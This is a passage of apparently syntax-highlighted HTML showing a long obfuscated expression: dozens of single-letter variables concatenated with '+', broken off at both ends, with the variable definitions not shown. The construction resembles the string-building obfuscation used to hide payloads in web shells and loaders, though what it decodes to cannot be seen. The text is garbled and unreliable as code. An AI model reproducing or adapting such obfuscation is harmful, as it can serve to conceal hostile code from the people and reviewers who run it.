class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span><span class="variable">$i</span><span class="variable">$q</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$e</span><span class="variable">$z</span><span class="variable">$q</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$e</span><span class="variable">$i</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$x</span><span class="variable">$z</span><span class="variable">$e</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span><span class="variable">$z</span><span class="variable">$u</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span><span class="variable">$i</span><span class="variable">$q</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$u</span><span class="variable">$u</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$b</span><span class="variable">$z</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$b</span><span class="variable">$o</span><span class="variable">$e</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$x</span><span class="variable">$b</span><span class="variable">$d</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$o</span><span class="variable">$d</span><span class="variable">$l</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$u</span><span class="variable">$u</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$u</span><span class="variable">$l</span><span class="variable">$i</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$l</span><span class="variable">$x</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$u</span><span class="variable">$z</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$b</span><span class="variable">$x</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span><span class="variable">$q</span><span class="variable">$l</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$z</span><span class="variable">$x</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$q</span><span class="variable">$z</span><span class="variable">$b</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$e</span><span class="variable">$u</span><span class="variable">$q</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$e</span><span class="variable">$z</span><span class="variable">$q</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$i</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$q</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$x</span><span class="variable">$i</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$d</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$e</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$b</span><span class="variable">$x</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$q</span><span class="variable">$o</span><span class="variable">$o</span><span class="variable">$l</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span><span class="variable">$e</span><span class="variable">$b</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$i</span><span class="variable">$d</span><span class="variable">$l</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$u</span><span class="variable">$x</span><span class="variable">$d</span><span class="variable">$e</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$q</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$l</span>+<span class="variable">$g</span><span class="variable">$d</span><span class="variable">$o</span>+<span class="variable">$g</span><span class="variable">$o</span><span class="variable">$b</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$z</span>+<span class="variable">$g</span><span class="variable">$b</span><span class="variable">$u</span>+<span class="variable">$g</span><span class="variable">$z</span><span class="variable">$x</span>+<span class="variable">$g</span><span 